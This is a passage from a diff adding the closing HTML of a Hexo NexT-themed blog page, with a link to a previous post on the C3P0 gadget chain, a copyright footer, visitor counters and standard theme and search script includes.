+                <a href="/2025/04/01/C3P0%E9%93%BE-1/" rel="prev" title="C3P0链">
+                  <i class="fa fa-angle-left"></i> C3P0链
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Sean</span>
+  </div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
